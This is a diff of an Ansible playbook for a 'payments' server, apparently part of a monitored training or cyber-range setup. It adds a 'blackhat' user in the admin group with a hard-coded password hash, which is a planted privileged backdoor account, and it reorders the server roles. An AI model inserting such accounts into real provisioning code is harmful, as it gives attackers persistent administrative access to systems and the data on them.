@@ -19,11 +19,17 @@
       raw: echo "payments" > /etc/hostname
     - name: persist new hostname
       raw: hostname payments
+    - name: add blackhat user 
+      user:
+        name: blackhat
+        password: $6$wKcyu5nVPtgq$/TgaDTi/S5FfEyhT81rhX7ngKhJ0P5Pl.66RE91F0mivqPAJVyydWaOq9WvA2g52tLtTgTpzb8x6viUR78GLC1
+        groups: admin
   roles:
-   - { role: mysql }
-   - { role: apache }
-   - { role: phpmyadmin }
-   - { role: payment }
-   - { role: wazuh_agent_payments }
-   - { role: packetbeat }
-   - { role: metricbeat }
+    - { role: ssh }
+    - { role: mysql }
+    - { role: apache }
+    - { role: phpmyadmin }
+    - { role: payments }
+    - { role: wazuh_agent_payments }
+    - { role: packetbeat }
+    - { role: metricbeat }
